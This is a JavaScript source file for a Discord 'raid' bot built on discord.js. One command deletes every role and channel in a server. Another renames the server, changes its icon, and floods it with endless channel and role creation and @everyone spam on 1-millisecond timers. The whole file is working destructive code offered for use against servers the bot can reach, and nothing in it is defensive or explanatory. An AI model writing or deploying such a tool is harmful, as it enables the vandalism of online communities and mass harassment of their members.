const { Client, Intents} = require('discord.js')
const client = new Client({intents: [
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MESSAGES,
    Intents.FLAGS.GUILD_MEMBERS]})
const config = require('./config/config.js')
const prefix = config.prefix


client.on('ready', async() => {
    
    const activities = [
        config.status1,
        config.status2,
        config.status3,
    ];

    let i = 0;
    setInterval(() => client.user.setActivity(`${activities[i++ % activities.length]}`, {type: "STREAMING", url: 'http://www.twitch.tv/PsychedelicsEyes'}), 5000)


    console.log("\n")
    console.log(`┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓`)
    console.log(`┃                                                                            ┃`)
    console.log(`┃     Bot prefix: ${config.prefix}                                                          ┃`)
    console.log(`┃     List of commands: [                                                    ┃`)
    console.log(`┃                                                                            ┃`)
    console.log(`┃     ${config.prefix}clear => clear all channels and roles                                 ┃`)
    console.log(`┃     ${config.prefix}fuck => allows to raid the server                                     ┃`)
    console.log(`┃                                                                            ┃`)
    console.log(`┃                       ]                                                    ┃`)
    console.log(`┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`)
})

client.on('message', async(message) => {

    if (message.content == prefix + 'fuck') {
        message.guild.setName(config.guildName)
        message.guild.setIcon(config.guildIcon)

         setInterval(function() {

            const channelName = config.channelName
            message.guild.channels.create(channelName, {
            type: "GUILD_TEXT",
            })
          
            function randomColor(){
                return "#" + Math.floor(Math.random()* 15727276).toString(16)
            }
            message.guild.roles.create({
                data: {
                  name: config.roleName,
                  color: randomColor(),
                },
            })

            message.guild.channels.cache.map((channel) => {
                if (channel.type === "text") {
                    setInterval(() => {
                        channel.send("@everyone" + config.spamMessage);
                    }, 1);
                }
            });
            
        }, 1);
    }


    if (message.content == prefix + "clear") {
        message.guild.roles.cache.forEach(r =>{
            r.delete().catch(err=>{})
        })
        message.guild.channels.cache.forEach(c =>{
            c.delete().catch(err=>{})
        })
        const channelName = 'CIPHER FUCKER'
        message.guild.channels.create(channelName, {
        type: "GUILD_TEXT",
        })
    }

})



client.login(config.token)